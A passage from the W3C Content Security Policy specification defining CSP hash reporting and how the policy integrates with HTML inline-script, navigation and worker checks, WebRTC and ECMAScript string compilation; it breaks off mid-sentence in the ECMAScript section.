9.  If `global`{.variable} is not a
    [`Window`{.idl}](https://html.spec.whatwg.org/multipage/nav-history-apis.html#window){#ref-for-window①
    link-type="idl"}, return.

10. Let `stripped document URL`{.variable} to be the result of executing
    [§ 5.4 Strip URL for use in reports](#strip-url-for-use-in-reports)
    on `global`{.variable}'s
    [document](https://html.spec.whatwg.org/multipage/nav-history-apis.html#concept-document-window){#ref-for-concept-document-window①
    link-type="dfn"}'s
    [URL](https://dom.spec.whatwg.org/#concept-document-url){#ref-for-concept-document-url
    link-type="dfn"}.

11. If `policy`{.variable}'s [directive
    set](#policy-directive-set){#ref-for-policy-directive-set⑦
    link-type="dfn"} does not contain a
    [directive](#directives){#ref-for-directives⑨ link-type="dfn"} named
    \"report-to\", return.

12. Let `report-to directive`{.variable} be a
    [directive](#directives){#ref-for-directives①⓪ link-type="dfn"}
    named \"report-to\" from `policy`{.variable}'s [directive
    set](#policy-directive-set){#ref-for-policy-directive-set⑧
    link-type="dfn"}.

13. Let `body`{.variable} be a [csp hash report
    body](#csp-hash-report-body){#ref-for-csp-hash-report-body
    link-type="dfn"} with `stripped document URL`{.variable} as its
    [documentURL](#csp-hash-report-body-documenturl){#ref-for-csp-hash-report-body-documenturl
    link-type="dfn"}, `request`{.variable}'s URL as its
    [subresourceURL](#csp-hash-report-body-subresourceurl){#ref-for-csp-hash-report-body-subresourceurl
    link-type="dfn"}, `hash`{.variable} as its
    [hash](#csp-hash-report-body-hash){#ref-for-csp-hash-report-body-hash
    link-type="dfn"}, `request`{.variable}'s
    [destination](https://fetch.spec.whatwg.org/#concept-request-destination){#ref-for-concept-request-destination
    link-type="dfn"} as its
    [destination](#csp-hash-report-body-destination){#ref-for-csp-hash-report-body-destination
    link-type="dfn"}, and \"subresource\" as its
    [type](#csp-hash-report-body-type){#ref-for-csp-hash-report-body-type
    link-type="dfn"}.

14. [Generate and queue a
    report](https://www.w3.org/TR/reporting-1/#generate-and-queue-a-report){#ref-for-generate-and-queue-a-report
    link-type="dfn"} with the following arguments:

    `context`{.variable}

    :   `settings object`{.variable}

    `type`{.variable}

    :   \"csp-hash\"

    `destination`{.variable}

    :   `report-to directive`{.variable}'s
        [value](#directive-value){#ref-for-directive-value⑦
        link-type="dfn"}.

    `data`{.variable}

    :   `body`{.variable}

### [4.2. ]{.secno}[ Integration with HTML ]{.content}[](#html-integration){.self-link} {#html-integration .heading .settled level="4.2"}

1.  The [policy
    container](https://html.spec.whatwg.org/multipage/browsers.html#policy-container){#ref-for-policy-container
    link-type="dfn"} has a [CSP
    list](https://html.spec.whatwg.org/multipage/browsers.html#policy-container-csp-list){#ref-for-policy-container-csp-list⑥
    link-type="dfn"}, which holds all the
    [policy](#content-security-policy-object){#ref-for-content-security-policy-object②③
    link-type="dfn"} objects which are active for a given context. This
    list is empty unless otherwise specified, and is populated from the
    [response](https://fetch.spec.whatwg.org/#concept-response){#ref-for-concept-response⑦
    link-type="dfn"} by
    [parsing](#abstract-opdef-parse-a-responses-content-security-policies){#ref-for-abstract-opdef-parse-a-responses-content-security-policies①
    link-type="abstract-op"}
    [response](https://fetch.spec.whatwg.org/#concept-response){#ref-for-concept-response⑧
    link-type="dfn"}'s Content Security Policies or inherited following
    the rules of the [policy
    container](https://html.spec.whatwg.org/multipage/browsers.html#policy-container){#ref-for-policy-container①
    link-type="dfn"}.

2.  A [global
    object](https://html.spec.whatwg.org/multipage/webappapis.html#global-object){#ref-for-global-object⑤
    link-type="dfn"}'s [CSP list]{#global-object-csp-list .dfn
    .dfn-paneled dfn-for="global object" dfn-type="dfn" noexport=""} is
    the result of executing [§ 4.2.2 Retrieve the CSP list of an
    object](#get-csp-of-object) with the [global
    object](https://html.spec.whatwg.org/multipage/webappapis.html#global-object){#ref-for-global-object⑥
    link-type="dfn"} as the `object`.

3.  A
    [policy](#content-security-policy-object){#ref-for-content-security-policy-object②④
    link-type="dfn"} is [enforced]{#enforced .dfn .dfn-paneled
    dfn-type="dfn" export=""} or [monitored]{#monitored .dfn
    .dfn-paneled dfn-type="dfn" export=""} for a [global
    object](https://html.spec.whatwg.org/multipage/webappapis.html#global-object){#ref-for-global-object⑦
    link-type="dfn"} by inserting it into the [global
    object](https://html.spec.whatwg.org/multipage/webappapis.html#global-object){#ref-for-global-object⑧
    link-type="dfn"}'s [CSP
    list](#global-object-csp-list){#ref-for-global-object-csp-list
    link-type="dfn"}.

4.  [§ 4.2.1 Run CSP initialization for a
    Document](#run-document-csp-initialization){#ref-for-run-document-csp-initialization①}
    is called during the [create and initialize a new `Document`
    object](https://html.spec.whatwg.org/#initialise-the-document-object){#ref-for-initialise-the-document-object
    link-type="dfn"} algorithm.

5.  [§ 4.2.3 Should element's inline type behavior be blocked by Content
    Security
    Policy?](#should-block-inline){#ref-for-should-block-inline①} is
    called during the [prepare the script
    element](https://html.spec.whatwg.org/#prepare-the-script-element){#ref-for-prepare-the-script-element
    link-type="dfn"} and [update a `style`
    block](https://html.spec.whatwg.org/multipage/semantics.html#update-a-style-block){#ref-for-update-a-style-block
    link-type="dfn"} algorithms in order to determine whether or not an
    inline script or style block is allowed to execute/render.

6.  [§ 4.2.3 Should element's inline type behavior be blocked by Content
    Security
    Policy?](#should-block-inline){#ref-for-should-block-inline②} is
    called during handling of inline event handlers (like `onclick`) and
    inline `style` attributes in order to determine whether or not they
    ought to be allowed to execute/render.

7.  [policy](#content-security-policy-object){#ref-for-content-security-policy-object②⑤
    link-type="dfn"} is [enforced](#enforced){#ref-for-enforced①
    link-type="dfn"} during processing of the
    [`meta`](https://html.spec.whatwg.org/multipage/semantics.html#meta){#ref-for-meta⑨
    link-type="element"} element's
    [`http-equiv`](https://html.spec.whatwg.org/multipage/semantics.html#attr-meta-http-equiv){#ref-for-attr-meta-http-equiv②
    link-type="element-sub"}.

8.  HTML populates each
    [request](https://fetch.spec.whatwg.org/#concept-request){#ref-for-concept-request①②
    link-type="dfn"}'s [cryptographic nonce
    metadata](https://fetch.spec.whatwg.org/#concept-request-nonce-metadata){#ref-for-concept-request-nonce-metadata
    link-type="dfn"} and [parser
    metadata](https://fetch.spec.whatwg.org/#concept-request-parser-metadata){#ref-for-concept-request-parser-metadata
    link-type="dfn"} with relevant data from the elements responsible
    for resource loading.

    [](#issue-5599665e){.self-link} Stylesheet loading is not yet
    integrated with Fetch in WHATWG's HTML. [\[whatwg/html Issue
    #968\]](https://github.com/whatwg/html/issues/968)

9.  [§ 6.3.1.1 Is base allowed for
    document?](#allow-base-for-document){#ref-for-allow-base-for-document}
    is called during
    [`base`](https://html.spec.whatwg.org/multipage/semantics.html#the-base-element){#ref-for-the-base-element
    link-type="element"}'s [set the frozen base
    URL](https://html.spec.whatwg.org/multipage/semantics.html#set-the-frozen-base-url){#ref-for-set-the-frozen-base-url
    link-type="dfn"} algorithm to ensure that the
    [`href`](https://html.spec.whatwg.org/multipage/semantics.html#attr-base-href){#ref-for-attr-base-href
    link-type="element-sub"} attribute's value is valid.

10. [§ 4.2.4 Should navigation request of type be blocked by Content
    Security
    Policy?](#should-block-navigation-request){#ref-for-should-block-navigation-request②}
    is called during the [create navigation params by
    fetching](https://html.spec.whatwg.org/multipage/browsing-the-web.html#create-navigation-params-by-fetching){#ref-for-create-navigation-params-by-fetching
    link-type="dfn"} algorithm, and [§ 4.2.5 Should navigation response
    to navigation request of type in target be blocked by Content
    Security
    Policy?](#should-block-navigation-response){#ref-for-should-block-navigation-response①}
    is called during the [attempt to populate the history entry's
    document](https://html.spec.whatwg.org/multipage/browsing-the-web.html#attempt-to-populate-the-history-entry's-document){#ref-for-attempt-to-populate-the-history-entry's-document
    link-type="dfn"} algorithm to apply directive's navigation checks,
    as well as inline checks for navigations to `javascript:` URLs.

11. [§ 4.2.6 Run CSP initialization for a global
    object](#run-global-object-csp-initialization){#ref-for-run-global-object-csp-initialization①}
    is called during the [run a
    worker](https://html.spec.whatwg.org/multipage/workers.html#run-a-worker){#ref-for-run-a-worker
    link-type="dfn"} algorithm.

12. The [sandbox](#sandbox){#ref-for-sandbox link-type="dfn"} directive
    is used to populate the [CSP-derived sandboxing
    flags](https://html.spec.whatwg.org/multipage/browsers.html#csp-derived-sandboxing-flags){#ref-for-csp-derived-sandboxing-flags
    link-type="dfn"}.

#### [4.2.1. ]{.secno}[ Run `CSP` initialization for a `Document` ]{.content}[](#run-document-csp-initialization){#ref-for-run-document-csp-initialization② .self-link} {#run-document-csp-initialization .algorithm .dfn-paneled .heading .settled algorithm="Run CSP initialization for a Document" dfn-type="dfn" export="" level="4.2.1" lt="Run CSP initialization for a Document"}

Given a
[`Document`{.idl}](https://dom.spec.whatwg.org/#document){#ref-for-document④
link-type="idl"} `document`{.variable}, the user agent performs the
following steps in order to initialize CSP for `document`{.variable}:

1.  [For
    each](https://infra.spec.whatwg.org/#list-iterate){#ref-for-list-iterate⑧
    link-type="dfn"} `policy`{.variable} of `document`{.variable}'s
    [policy
    container](https://html.spec.whatwg.org/multipage/dom.html#concept-document-policy-container){#ref-for-concept-document-policy-container
    link-type="dfn"}'s [CSP
    list](https://html.spec.whatwg.org/multipage/browsers.html#policy-container-csp-list){#ref-for-policy-container-csp-list⑦
    link-type="dfn"}:

    1.  [For
        each](https://infra.spec.whatwg.org/#list-iterate){#ref-for-list-iterate⑨
        link-type="dfn"} `directive`{.variable} of `policy`{.variable}:

        1.  Execute `directive`{.variable}'s
            [initialization](#directive-initialization){#ref-for-directive-initialization
            link-type="dfn"} algorithm on `document`{.variable}, and
            assert: its returned value is \"`Allowed`\".

#### [4.2.2. ]{.secno}[ Retrieve the [CSP list](#global-object-csp-list){#ref-for-global-object-csp-list① link-type="dfn"} of an `object`{.variable} ]{.content}[](#get-csp-of-object){.self-link} {#get-csp-of-object .algorithm .heading .settled algorithm="Retrieve the CSP list of an object" level="4.2.2"}

To obtain `object`{.variable}'s [CSP
list](#global-object-csp-list){#ref-for-global-object-csp-list②
link-type="dfn"}:

1.  If `object`{.variable} is a
    [`Document`{.idl}](https://dom.spec.whatwg.org/#document){#ref-for-document⑤
    link-type="idl"} return `object`{.variable}'s [policy
    container](https://html.spec.whatwg.org/multipage/dom.html#concept-document-policy-container){#ref-for-concept-document-policy-container①
    link-type="dfn"}'s [CSP
    list](https://html.spec.whatwg.org/multipage/browsers.html#policy-container-csp-list){#ref-for-policy-container-csp-list⑧
    link-type="dfn"}.

2.  If `object`{.variable} is a
    [`Window`{.idl}](https://html.spec.whatwg.org/multipage/nav-history-apis.html#window){#ref-for-window②
    link-type="idl"} or a
    [`WorkerGlobalScope`{.idl}](https://html.spec.whatwg.org/multipage/workers.html#workerglobalscope){#ref-for-workerglobalscope①
    link-type="idl"} or a
    [`WorkletGlobalScope`{.idl}](https://html.spec.whatwg.org/multipage/worklets.html#workletglobalscope){#ref-for-workletglobalscope①
    link-type="idl"}, return [environment settings
    object](https://html.spec.whatwg.org/multipage/webappapis.html#environment-settings-object){#ref-for-environment-settings-object①
    link-type="dfn"}'s [policy
    container](https://html.spec.whatwg.org/multipage/webappapis.html#concept-settings-object-policy-container){#ref-for-concept-settings-object-policy-container
    link-type="dfn"}'s [CSP
    list](https://html.spec.whatwg.org/multipage/browsers.html#policy-container-csp-list){#ref-for-policy-container-csp-list⑨
    link-type="dfn"}.

3.  Return null.

#### [4.2.3. ]{.secno}[ Should `element`{.variable}'s inline `type`{.variable} behavior be blocked by Content Security Policy? ]{.content}[](#should-block-inline){#ref-for-should-block-inline③ .self-link} {#should-block-inline .algorithm .dfn-paneled .heading .settled algorithm="Should element’s inline type behavior be blocked by Content Security Policy?" dfn-type="dfn" export="" level="4.2.3" lt="Should element’s inline type behavior be blocked by Content Security Policy?"}

Given an
[`Element`{.idl}](https://dom.spec.whatwg.org/#element){#ref-for-element①
link-type="idl"} `element`{.variable}, a string `type`{.variable}, and a
string `source`{.variable} this algorithm returns \"`Allowed`\" if the
element is allowed to have inline definition of a particular type of
behavior (script execution, style application, event handlers, etc.),
and \"`Blocked`\" otherwise:

[Note:]{.marker} The valid values for `type`{.variable} are
\"`script`\", \"`script attribute`\", \"`style`\", and
\"`style attribute`\".

1.  Assert: `element`{.variable} is not null.

2.  Let `result`{.variable} be \"`Allowed`\".

3.  [For
    each](https://infra.spec.whatwg.org/#list-iterate){#ref-for-list-iterate①⓪
    link-type="dfn"} `policy`{.variable} of `element`{.variable}'s
    [`Document`{.idl}](https://dom.spec.whatwg.org/#document){#ref-for-document⑥
    link-type="idl"}'s [global
    object](https://html.spec.whatwg.org/multipage/webappapis.html#global-object){#ref-for-global-object⑨
    link-type="dfn"}'s [CSP
    list](#global-object-csp-list){#ref-for-global-object-csp-list③
    link-type="dfn"}:

    1.  [For
        each](https://infra.spec.whatwg.org/#list-iterate){#ref-for-list-iterate①①
        link-type="dfn"} `directive`{.variable} of `policy`{.variable}'s
        [directive
        set](#policy-directive-set){#ref-for-policy-directive-set⑨
        link-type="dfn"}:

        1.  If `directive`{.variable}'s [inline
            check](#directive-inline-check){#ref-for-directive-inline-check
            link-type="dfn"} returns \"`Allowed`\" when executed upon
            `element`{.variable}, `type`{.variable}, `policy`{.variable}
            and `source`{.variable}, skip to the next
            `directive`{.variable}.

        2.  Let `directive-name`{.variable} be the result of executing
            [§ 6.8.2 Get the effective directive for inline
            checks](#effective-directive-for-inline-check) on
            `type`{.variable}.

        3.  Otherwise, let `violation`{.variable} be the result of
            executing [§ 2.4.1 Create a violation object for global,
            policy, and directive](#create-violation-for-global) on the
            [current settings
            object](https://html.spec.whatwg.org/multipage/webappapis.html#current-settings-object){#ref-for-current-settings-object
            link-type="dfn"}'s [global
            object](https://html.spec.whatwg.org/multipage/webappapis.html#concept-settings-object-global){#ref-for-concept-settings-object-global①
            link-type="dfn"}, `policy`{.variable}, and
            `directive-name`{.variable}.

        4.  Set `violation`{.variable}'s
            [resource](#violation-resource){#ref-for-violation-resource⑤
            link-type="dfn"} to \"`inline`\".

        5.  Set `violation`{.variable}'s
            [element](#violation-element){#ref-for-violation-element
            link-type="dfn"} to `element`{.variable}.

        6.  If `directive`{.variable}'s
            [value](#directive-value){#ref-for-directive-value⑧
            link-type="dfn"}
            [contains](https://infra.spec.whatwg.org/#list-contain){#ref-for-list-contain④
            link-type="dfn"} the expression
            \"[`'report-sample'`](#grammardef-report-sample){#ref-for-grammardef-report-sample①
            link-type="grammar"}\", then set `violation`{.variable}'s
            [sample](#violation-sample){#ref-for-violation-sample②
            link-type="dfn"} to the substring of `source`{.variable}
            containing its first 40 characters.

        7.  Execute [§ 5.5 Report a violation](#report-violation) on
            `violation`{.variable}.

        8.  If `policy`{.variable}'s
            [disposition](#policy-disposition){#ref-for-policy-disposition⑧
            link-type="dfn"} is \"`enforce`\", then set
            `result`{.variable} to \"`Blocked`\".

4.  Return `result`{.variable}.

#### [4.2.4. ]{.secno}[ Should `navigation request`{.variable} of `type`{.variable} be blocked by Content Security Policy? ]{.content}[](#should-block-navigation-request){#ref-for-should-block-navigation-request③ .self-link} {#should-block-navigation-request .algorithm .dfn-paneled .heading .settled algorithm="Should navigation request of type be blocked
    by Content Security Policy?" dfn-type="dfn" export="" level="4.2.4" lt="Should navigation request of type be blocked by Content Security Policy?"}

Given a
[request](https://fetch.spec.whatwg.org/#concept-request){#ref-for-concept-request①③
link-type="dfn"} `navigation request`{.variable} and a string
`type`{.variable} (either \"`form-submission`\" or \"`other`\"), this
algorithm return \"`Blocked`\" if the active policy blocks the
navigation, and \"`Allowed`\" otherwise:

1.  Let `result`{.variable} be \"`Allowed`\".

2.  [For
    each](https://infra.spec.whatwg.org/#list-iterate){#ref-for-list-iterate①②
    link-type="dfn"} `policy`{.variable} of
    `navigation request`{.variable}'s [policy
    container](https://fetch.spec.whatwg.org/#concept-request-policy-container){#ref-for-concept-request-policy-container⑥
    link-type="dfn"}'s [CSP
    list](https://html.spec.whatwg.org/multipage/browsers.html#policy-container-csp-list){#ref-for-policy-container-csp-list①⓪
    link-type="dfn"}:

    1.  [For
        each](https://infra.spec.whatwg.org/#list-iterate){#ref-for-list-iterate①③
        link-type="dfn"} `directive`{.variable} of `policy`{.variable}:

        1.  If `directive`{.variable}'s [pre-navigation
            check](#directive-pre-navigation-check){#ref-for-directive-pre-navigation-check
            link-type="dfn"} returns \"`Allowed`\" when executed upon
            `navigation request`{.variable}, `type`{.variable}, and
            `policy`{.variable} skip to the next `directive`{.variable}.

        2.  Otherwise, let `violation`{.variable} be the result of
            executing [§ 2.4.1 Create a violation object for global,
            policy, and directive](#create-violation-for-global) on
            `navigation request`{.variable}'s
            [client](https://fetch.spec.whatwg.org/#concept-request-client){#ref-for-concept-request-client②
            link-type="dfn"}'s [global
            object](https://html.spec.whatwg.org/multipage/webappapis.html#concept-settings-object-global){#ref-for-concept-settings-object-global②
            link-type="dfn"}, `policy`{.variable}, and
            `directive`{.variable}'s
            [name](#directive-name){#ref-for-directive-name③
            link-type="dfn"}.

        3.  Set `violation`{.variable}'s
            [resource](#violation-resource){#ref-for-violation-resource⑥
            link-type="dfn"} to `navigation request`{.variable}'s
            [URL](https://fetch.spec.whatwg.org/#concept-request-url){#ref-for-concept-request-url②
            link-type="dfn"}.

        4.  Execute [§ 5.5 Report a violation](#report-violation) on
            `violation`{.variable}.

        5.  If `policy`{.variable}'s
            [disposition](#policy-disposition){#ref-for-policy-disposition⑨
            link-type="dfn"} is \"`enforce`\", then set
            `result`{.variable} to \"`Blocked`\".

3.  If `result`{.variable} is \"`Allowed`\", and if
    `navigation request`{.variable}'s [current
    URL](https://fetch.spec.whatwg.org/#concept-request-current-url){#ref-for-concept-request-current-url①
    link-type="dfn"}'s
    [scheme](https://url.spec.whatwg.org/#concept-url-scheme){#ref-for-concept-url-scheme
    link-type="dfn"} is `javascript`:

    1.  [For
        each](https://infra.spec.whatwg.org/#list-iterate){#ref-for-list-iterate①④
        link-type="dfn"} `policy`{.variable} of
        `navigation request`{.variable}'s [policy
        container](https://fetch.spec.whatwg.org/#concept-request-policy-container){#ref-for-concept-request-policy-container⑦
        link-type="dfn"}'s [CSP
        list](https://html.spec.whatwg.org/multipage/browsers.html#policy-container-csp-list){#ref-for-policy-container-csp-list①①
        link-type="dfn"}:

        1.  [For
            each](https://infra.spec.whatwg.org/#list-iterate){#ref-for-list-iterate①⑤
            link-type="dfn"} `directive`{.variable} of
            `policy`{.variable}:

            1.  Let `directive-name`{.variable} be the result of
                executing [§ 6.8.2 Get the effective directive for
                inline checks](#effective-directive-for-inline-check) on
                \"`navigation`\".

            2.  If `directive`{.variable}'s [inline
                check](#directive-inline-check){#ref-for-directive-inline-check①
                link-type="dfn"} returns \"`Allowed`\" when executed
                upon null, \"`navigation`\" and
                `navigation request`{.variable}'s [current
                URL](https://fetch.spec.whatwg.org/#concept-request-current-url){#ref-for-concept-request-current-url②
                link-type="dfn"}, skip to the next
                `directive`{.variable}.

            3.  Otherwise, let `violation`{.variable} be the result of
                executing [§ 2.4.1 Create a violation object for global,
                policy, and directive](#create-violation-for-global) on
                `navigation request`{.variable}'s
                [client](https://fetch.spec.whatwg.org/#concept-request-client){#ref-for-concept-request-client③
                link-type="dfn"}'s [global
                object](https://html.spec.whatwg.org/multipage/webappapis.html#concept-settings-object-global){#ref-for-concept-settings-object-global③
                link-type="dfn"}, `policy`{.variable}, and
                `directive-name`{.variable}.

            4.  Set `violation`{.variable}'s
                [resource](#violation-resource){#ref-for-violation-resource⑦
                link-type="dfn"} to \"`inline`\".

            5.  Execute [§ 5.5 Report a violation](#report-violation) on
                `violation`{.variable}.

            6.  If `policy`{.variable}'s
                [disposition](#policy-disposition){#ref-for-policy-disposition①⓪
                link-type="dfn"} is \"`enforce`\", then set
                `result`{.variable} to \"`Blocked`\".

4.  Return `result`{.variable}.

#### [4.2.5. ]{.secno}[ Should `navigation response`{.variable} to `navigation request`{.variable} of `type`{.variable} in `target`{.variable} be blocked by Content Security Policy? ]{.content}[](#should-block-navigation-response){#ref-for-should-block-navigation-response② .self-link} {#should-block-navigation-response .algorithm .dfn-paneled .heading .settled algorithm="Should navigation response to navigation request of type
    in target be blocked by Content Security Policy?" dfn-type="dfn" export="" level="4.2.5" lt="Should navigation response to navigation request of type in target be blocked by Content Security Policy?"}

Given a
[request](https://fetch.spec.whatwg.org/#concept-request){#ref-for-concept-request①④
link-type="dfn"} `navigation request`{.variable}, a
[response](https://fetch.spec.whatwg.org/#concept-response){#ref-for-concept-response⑨
link-type="dfn"} `navigation response`{.variable}, a [CSP
list](#csp-list){#ref-for-csp-list① link-type="dfn"}
`response CSP list`{.variable}, a string `type`{.variable} (either
\"`form-submission`\" or \"`other`\"), and a
[navigable](https://html.spec.whatwg.org/#navigable){#ref-for-navigable①
link-type="dfn"} `target`{.variable}, this algorithm returns
\"`Blocked`\" if the active policy blocks the navigation, and
\"`Allowed`\" otherwise:

1.  Let `result`{.variable} be \"`Allowed`\".

2.  [For
    each](https://infra.spec.whatwg.org/#list-iterate){#ref-for-list-iterate①⑥
    link-type="dfn"} `policy`{.variable} of
    `response CSP list`{.variable}:

    [Note:]{.marker} Some directives (like
    [frame-ancestors](#frame-ancestors){#ref-for-frame-ancestors
    link-type="dfn"}) allow a `response`{.variable}'s [Content Security
    Policy](#content-security-policy){#ref-for-content-security-policy
    link-type="dfn"} to act on the navigation.

    1.  [For
        each](https://infra.spec.whatwg.org/#list-iterate){#ref-for-list-iterate①⑦
        link-type="dfn"} `directive`{.variable} of `policy`{.variable}:

        1.  If `directive`{.variable}'s [navigation response
            check](#directive-navigation-response-check){#ref-for-directive-navigation-response-check
            link-type="dfn"} returns \"`Allowed`\" when executed upon
            `navigation request`{.variable}, `type`{.variable},
            `navigation response`{.variable}, `target`{.variable},
            \"`response`\", and `policy`{.variable} skip to the next
            `directive`{.variable}.

        2.  Otherwise, let `violation`{.variable} be the result of
            executing [§ 2.4.1 Create a violation object for global,
            policy, and directive](#create-violation-for-global) on
            null, `policy`{.variable}, and `directive`{.variable}'s
            [name](#directive-name){#ref-for-directive-name④
            link-type="dfn"}.

            [Note:]{.marker} We use null for the global object, as no
            global exists: we haven't processed the navigation to create
            a Document yet.

        3.  Set `violation`{.variable}'s
            [resource](#violation-resource){#ref-for-violation-resource⑧
            link-type="dfn"} to `navigation response`{.variable}'s
            [URL](https://fetch.spec.whatwg.org/#concept-response-url){#ref-for-concept-response-url①
            link-type="dfn"}.

        4.  Execute [§ 5.5 Report a violation](#report-violation) on
            `violation`{.variable}.

        5.  If `policy`{.variable}'s
            [disposition](#policy-disposition){#ref-for-policy-disposition①①
            link-type="dfn"} is \"`enforce`\", then set
            `result`{.variable} to \"`Blocked`\".

3.  [For
    each](https://infra.spec.whatwg.org/#list-iterate){#ref-for-list-iterate①⑧
    link-type="dfn"} `policy`{.variable} of
    `navigation request`{.variable}'s [policy
    container](https://fetch.spec.whatwg.org/#concept-request-policy-container){#ref-for-concept-request-policy-container⑧
    link-type="dfn"}'s [CSP
    list](https://html.spec.whatwg.org/multipage/browsers.html#policy-container-csp-list){#ref-for-policy-container-csp-list①②
    link-type="dfn"}:

    [Note:]{.marker} Some directives in the
    `navigation request`{.variable}'s context (like
    [frame-ancestors](#frame-ancestors){#ref-for-frame-ancestors①
    link-type="dfn"}) need the `response`{.variable} before acting on
    the navigation.

    1.  [For
        each](https://infra.spec.whatwg.org/#list-iterate){#ref-for-list-iterate①⑨
        link-type="dfn"} `directive`{.variable} of `policy`{.variable}:

        1.  If `directive`{.variable}'s [navigation response
            check](#directive-navigation-response-check){#ref-for-directive-navigation-response-check①
            link-type="dfn"} returns \"`Allowed`\" when executed upon
            `navigation request`{.variable}, `type`{.variable},
            `navigation response`{.variable}, `target`{.variable},
            \"`source`\", and `policy`{.variable} skip to the next
            `directive`{.variable}.

        2.  Otherwise, let `violation`{.variable} be the result of
            executing [§ 2.4.1 Create a violation object for global,
            policy, and directive](#create-violation-for-global) on
            `navigation request`{.variable}'s
            [client](https://fetch.spec.whatwg.org/#concept-request-client){#ref-for-concept-request-client④
            link-type="dfn"}'s [global
            object](https://html.spec.whatwg.org/multipage/webappapis.html#concept-settings-object-global){#ref-for-concept-settings-object-global④
            link-type="dfn"}, `policy`{.variable}, and
            `directive`{.variable}'s
            [name](#directive-name){#ref-for-directive-name⑤
            link-type="dfn"}.

        3.  Set `violation`{.variable}'s
            [resource](#violation-resource){#ref-for-violation-resource⑨
            link-type="dfn"} to `navigation request`{.variable}'s
            [URL](https://fetch.spec.whatwg.org/#concept-request-url){#ref-for-concept-request-url③
            link-type="dfn"}.

        4.  Execute [§ 5.5 Report a violation](#report-violation) on
            `violation`{.variable}.

        5.  If `policy`{.variable}'s
            [disposition](#policy-disposition){#ref-for-policy-disposition①②
            link-type="dfn"} is \"`enforce`\", then set
            `result`{.variable} to \"`Blocked`\".

4.  Return `result`{.variable}.

#### [4.2.6. ]{.secno}[ Run `CSP` initialization for a global object ]{.content}[](#run-global-object-csp-initialization){#ref-for-run-global-object-csp-initialization② .self-link} {#run-global-object-csp-initialization .algorithm .dfn-paneled .heading .settled algorithm="Run CSP initialization for a global object" dfn-type="dfn" export="" level="4.2.6" lt="Run CSP initialization for a global object"}

Given a [global
object](https://html.spec.whatwg.org/multipage/webappapis.html#global-object){#ref-for-global-object①⓪
link-type="dfn"} `global`{.variable}, the user agent performs the
following steps in order to initialize CSP for `global`{.variable}. This
algorithm returns \"`Allowed`\" if `global`{.variable} is allowed, and
\"`Blocked`\" otherwise:

1.  Let `result`{.variable} be \"`Allowed`\".

2.  [For
    each](https://infra.spec.whatwg.org/#list-iterate){#ref-for-list-iterate②⓪
    link-type="dfn"} `policy`{.variable} of `global`{.variable}'s [CSP
    list](#global-object-csp-list){#ref-for-global-object-csp-list④
    link-type="dfn"}:

    1.  [For
        each](https://infra.spec.whatwg.org/#list-iterate){#ref-for-list-iterate②①
        link-type="dfn"} `directive`{.variable} of `policy`{.variable}:

        1.  Execute `directive`{.variable}'s
            [initialization](#directive-initialization){#ref-for-directive-initialization①
            link-type="dfn"} algorithm on `global`{.variable}. If its
            returned value is \"`Blocked`\", then set
            `result`{.variable} to \"`Blocked`\".

3.  Return `result`{.variable}.

### [4.3. ]{.secno}[Integration with WebRTC]{.content}[](#webrtc-integration){.self-link} {#webrtc-integration .heading .settled level="4.3"}

The
[administratively-prohibited](https://www.w3.org/TR/webrtc/#dfn-administratively-prohibited){#ref-for-dfn-administratively-prohibited
link-type="dfn"} algorithm calls [§ 4.3.1 Should RTC connections be
blocked for global?](#should-block-rtc-connection) when invoked, and
prohibits all candidates if it returns \"`Blocked`\".

#### [4.3.1. ]{.secno}[ Should RTC connections be blocked for `global`{.variable}? ]{.content}[](#should-block-rtc-connection){.self-link} {#should-block-rtc-connection .heading .settled level="4.3.1"}

Given a [global
object](https://html.spec.whatwg.org/multipage/webappapis.html#global-object){#ref-for-global-object①①
link-type="dfn"} `global`{.variable}, this algorithm returns
\"`Blocked`\" if the active policy for `global`{.variable} blocks RTC
connections, and \"`Allowed`\" otherwise:

1.  Let `result`{.variable} be \"`Allowed`\".

2.  [For
    each](https://infra.spec.whatwg.org/#list-iterate){#ref-for-list-iterate②②
    link-type="dfn"} `policy`{.variable} of `global`{.variable}'s [CSP
    list](#global-object-csp-list){#ref-for-global-object-csp-list⑤
    link-type="dfn"}:

    1.  [For
        each](https://infra.spec.whatwg.org/#list-iterate){#ref-for-list-iterate②③
        link-type="dfn"} `directive`{.variable} of `policy`{.variable}:

        1.  If `directive`{.variable}'s [webrtc pre-connect
            check](#directive-webrtc-pre-connect-check){#ref-for-directive-webrtc-pre-connect-check
            link-type="dfn"} returns \"`Allowed`\",
            [continue](https://infra.spec.whatwg.org/#iteration-continue){#ref-for-iteration-continue②
            link-type="dfn"}.

        2.  Otherwise, let `violation`{.variable} be the result of
            executing [§ 2.4.1 Create a violation object for global,
            policy, and directive](#create-violation-for-global) on
            `global`{.variable}, `policy`{.variable}, and
            `directive`{.variable}'s
            [name](#directive-name){#ref-for-directive-name⑥
            link-type="dfn"}.

        3.  Set `violation`{.variable}'s
            [resource](#violation-resource){#ref-for-violation-resource①⓪
            link-type="dfn"} to null.

        4.  Execute [§ 5.5 Report a violation](#report-violation) on
            `violation`{.variable}.

        5.  If `policy`{.variable}'s
            [disposition](#policy-disposition){#ref-for-policy-disposition①③
            link-type="dfn"} is \"`enforce`\", then set
            `result`{.variable} to \"`Blocked`\".

3.  Return `result`{.variable}.

### [4.4. ]{.secno}[Integration with ECMAScript]{.content}[](#ecma-integration){.self-link} {#ecma-integration .heading .settled level="4.4"}

ECMAScript defines a
[`HostEnsureCanCompileStrings()`{.idl}](https://tc39.github.io/ecma262#sec-hostensurecancompilestrings){#ref-for-sec-hostensurecancompilestrings
link-type="idl"} abstract operation which allows the host environment to
block the compilation of strings into ECMAScript code. This document
defines an implementation of that abstract operation which examines the
relevant [CSP
list](#global-object-csp-list){#ref-for-global-object-csp-list⑥
link-type="dfn"} to determine whether such compilation ought to be
blocked.

#### [4.4.1. ]{.secno}[ EnsureCSPDoesNotBlockStringCompilation(`realm`{.variable}, `parameterStrings`{.variable}, `bodyString`{.variable}, `codeString`{.variable}, `compilationType`{.variable}, `parameterArgs`{.variable}, `bodyArg`{.variable}) ]{.content}[](#can-compile-strings){#ref-for-can-compile-strings .self-link} {#can-compile-strings .algorithm .dfn-paneled .heading .settled algorithm="EnsureCSPDoesNotBlockStringCompilation(realm, parameterStrings, bodyString, codeString, compilationType, parameterArgs, bodyArg)" dfn-type="dfn" export="" level="4.4.1" lt="EnsureCSPDoesNotBlockStringCompilation(realm, parameterStrings, bodyString, codeString, compilationType, parameterArgs, bodyArg)"}

Given a [realm](https://tc39.github.io/ecma262#realm){#ref-for-realm
link-type="dfn"} `realm`{.variable}, a list of strings
